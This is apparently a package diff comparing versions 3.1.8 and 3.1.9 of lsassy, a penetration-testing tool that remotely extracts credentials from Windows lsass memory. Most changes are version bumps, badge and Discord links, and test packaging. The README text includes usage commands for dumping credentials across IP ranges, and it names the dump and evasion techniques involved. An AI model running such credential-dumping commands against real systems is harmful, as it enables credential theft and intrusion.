```

#### html2text {}

```diff
@@ -1,46 +1,46 @@
-Metadata-Version: 2.1 Name: lsassy Version: 3.1.8 Summary: Python library to
+Metadata-Version: 2.1 Name: lsassy Version: 3.1.9 Summary: Python library to
 extract credentials from lsass remotely Home-page: https://github.com/Hackndo/
 lsassy/ Author: Pixis Author-email: hackndo@gmail.com License: MIT Classifier:
 Programming Language :: Python :: 3.6 Classifier: Programming Language ::
 Python :: 3.7 Classifier: Programming Language :: Python :: 3.8 Classifier:
 Programming Language :: Python :: 3.9 Classifier: License :: OSI Approved ::
 MIT License Classifier: Operating System :: OS Independent Requires-Python:
 >=3.6 Description-Content-Type: text/markdown License-File: LICENSE # lsassy [!
 [PyPI version](https://d25lcipzij17d.cloudfront.net/
-badge.svg?id=py&type=6&v=v3.1.8&x2=0)](https://pypi.org/project/lsassy) [![PyPI
+badge.svg?id=py&type=6&v=v3.1.9&x2=0)](https://pypi.org/project/lsassy) [![PyPI
 Statistics](https://img.shields.io/pypi/dm/lsassy.svg)](https://pypistats.org/
-packages/lsassy) [![Tests](https://github.com/hackndo/lsassy/workflows/Tests/
-badge.svg)](https://github.com/hackndo/lsassy/actions?workflow=Tests) [!
-[Twitter](https://img.shields.io/twitter/follow/
+packages/lsassy) [![Tests](https://github.com/hackndo/lsassy/actions/workflows/
+lsassy.yml/badge.svg)](https://github.com/hackndo/lsassy/
+actions?workflow=lsassy) [![Twitter](https://img.shields.io/twitter/follow/
 hackanddo?label=HackAndDo&style=social)](https://twitter.com/intent/
 follow?screen_name=hackanddo) _[_h_t_t_p_s_:_/_/_a_s_c_i_i_n_e_m_a_._o_r_g_/_a_/_4_4_1_5_8_2_._s_v_g_]Python tool
 to remotely extract credentials on a set of hosts. This [blog post](https://
 en.hackndo.com/remote-lsass-dump-passwords/) explains how it works. This tool
 uses [impacket](https://github.com/SecureAuthCorp/impacket) project to remotely
 read necessary bytes in lsass dump and [pypykatz](https://github.com/skelsec/
 pypykatz) to extract credentials. | Chapters | Description | |-----------------
 -----------------------------|-------------------------------------------------
 --------| | [Warning](#warning) | Before using this tool, read this | |
 [Installation](#installation) | Lsassy installation | | [Basic usage](#basic-
 usage) | Basic lsassy usage | | [Advanced usage](#advanced-usage) | Advanced
 lsassy usage with params explaination | | [Add dump method](#add-dump-method) |
 How to add a custom lsass dump method | | [Acknowledgments](#acknowledgments) |
-Kudos to these people and tools | | [Official Discord](#official-discord-
-channel)| Official Discord channel | ## Warning Although I have made every
-effort to make the tool stable, traces may be left if errors occur. This tool
-can either leave some lsass dumps if it failed to delete it (even though it
-tries hard to do so) or leave a scheduled task running if it fails to delete
-it. This shouldn't happen, but it might. Now, you know, use it with caution. ##
-Installation **lsassy** works with python >= 3.7 ### pip (Recommended) ```bash
-python3 -m pip install lsassy ``` ### From source for development ``` python3
-setup.py install ``` ## Basic Usage **lsassy** works out of the box on multiple
-targets (IP(s), range(s), CIDR(s), hostname(s), FQDN(s), file(s) containing a
-list of targets) ```bash lsassy [-d domain] -u pixis -p P4ssw0rd targets lsassy
-[-d domain] -u pixis -H [LM:]NT targets ``` By default, lsassy will try to dump
+Kudos to these people and tools | | [Official Discord](#official-discord) |
+Official Discord server | ## Warning Although I have made every effort to make
+the tool stable, traces may be left if errors occur. This tool can either leave
+some lsass dumps if it failed to delete it (even though it tries hard to do so)
+or leave a scheduled task running if it fails to delete it. This shouldn't
+happen, but it might. Now, you know, use it with caution. ## Installation
+**lsassy** works with python >= 3.7 ### pip (Recommended) ```bash python3 -
+m pip install lsassy ``` ### From source for development ``` python3 setup.py
+install ``` ## Basic Usage **lsassy** works out of the box on multiple targets
+(IP(s), range(s), CIDR(s), hostname(s), FQDN(s), file(s) containing a list of
+targets) ```bash lsassy [-d domain] -u pixis -p P4ssw0rd targets lsassy [-
+d domain] -u pixis -H [LM:]NT targets ``` By default, lsassy will try to dump
 lsass remotely using `comsvcs.dll` method, either via WMI or via a remote
 scheduled task. ### Kerberos **lsassy** can authenticate with Kerberos. It
 requires a valid TGT in `KRB5CCNAME` environment variable. See [advanced usage]
 (Lsassy-Advanced-Usage#kerberos) for more details. ```bash lsassy -k targets
 ``` ### Examples ```bash lsassy -d hackn.lab -u pixis -p P4ssw0rd 192.168.1.0/
 24 lsassy -d hackn.lab -u pixis -p P4ssw0rd 192.168.1.1-10 lsassy -d hackn.lab
 -u pixis -p P4ssw0rd hosts.txt lsassy -d hackn.lab -u pixis -p P4ssw0rd
@@ -227,12 +227,11 @@
 [EDRSandBlast](https://github.com/wavestone-cdt/EDRSandblast) * [s4ntiago_p]
 (https://twitter.com/s4ntiago_p) for [nanodump](https://github.com/helpsystems/
 nanodump) * [0gtweet](https://twitter.com/0gtweet) for [Rdrleakdiag technique]
 (https://twitter.com/0gtweet/status/1299071304805560321) * [Luis Rocha](https:/
 /twitter.com/countuponsec) for [SQLDumper technique](https://twitter.com/
 countuponsec/status/910969424215232518) * [Asaf Gilboa](https://
 mobile.twitter.com/asaf_gilboa) for [LsassSilentProcessExit technique](https://
-github.com/deepinstinct/LsassSilentProcessExit) ## Official Discord Channel [!
-[Porchetta Industries](https://discordapp.com/api/guilds/736724457258745996/
-widget.png?style=banner3)](https://discord.gg/sEkn3aa) ## Known bugs * Compiled
+github.com/deepinstinct/LsassSilentProcessExit) ## Official Discord [https://
+discord.hackndo.com](https://discord.hackndo.com) ## Known bugs * Compiled
 versions don't include table_output because of some weird error with rich
-library
+library ## Star History_[_S_t_a_r_ _H_i_s_t_o_r_y_ _C_h_a_r_t_]
```

### Comparing `lsassy-3.1.8/lsassy.egg-info/SOURCES.txt` & `lsassy-3.1.9/lsassy.egg-info/SOURCES.txt`

 * *Files 2% similar despite different names*

```diff
@@ -48,9 +48,8 @@
 lsassy/exec/task.py
 lsassy/exec/wmi.py
 lsassy/output/__init__.py
 lsassy/output/grep_output.py
 lsassy/output/json_output.py
 lsassy/output/pretty_output.py
 lsassy/output/table_output.py
-tests/__init__.py
 tests/test_lsassy.py
```

### Comparing `lsassy-3.1.8/pyproject.toml` & `lsassy-3.1.9/pyproject.toml`

 * *Files 0% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 [tool.poetry]
 name = "lsassy"
-version = "3.1.8"
+version = "3.1.9"
 description = "Tool to remotely extract credentials"
 readme = "README.md"
 homepage = "https://github.com/hackndo/lsassy"
 repository = "https://github.com/hackndo/lsassy"
 keywords = ["lsassy", "lsass", "pypykatz", "credentials"]
 authors = ["pixis <hackndo@gmail.com>"]
```

### Comparing `lsassy-3.1.8/setup.py` & `lsassy-3.1.9/setup.py`

 * *Files 5% similar despite different names*

```diff
@@ -9,21 +9,21 @@
 from setuptools import setup, find_packages
 
 HERE = pathlib.Path(__file__).parent
 README = (HERE / "README.md").read_text()
 
 setup(
     name="lsassy",
-    version="3.1.8",
+    version="3.1.9",
     author="Pixis",
     author_email="hackndo@gmail.com",
     description="Python library to extract credentials from lsass remotely",
     long_description=README,
     long_description_content_type="text/markdown",
-    packages=find_packages(exclude=["assets"]),
+    packages=find_packages(exclude=["assets", "tests*"]),
     include_package_data=True,
     url="https://github.com/Hackndo/lsassy/",
     zip_safe = True,
     license="MIT",
     install_requires=[
         'impacket',
         'netaddr',
@@ -40,9 +40,9 @@
         "Operating System :: OS Independent",
     ),
     entry_points={
         'console_scripts': [
             'lsassy = lsassy.console:main',
         ],
     },
-    test_suite='tests.tests'
+    test_suite='tests.test_lsassy'
 )
```

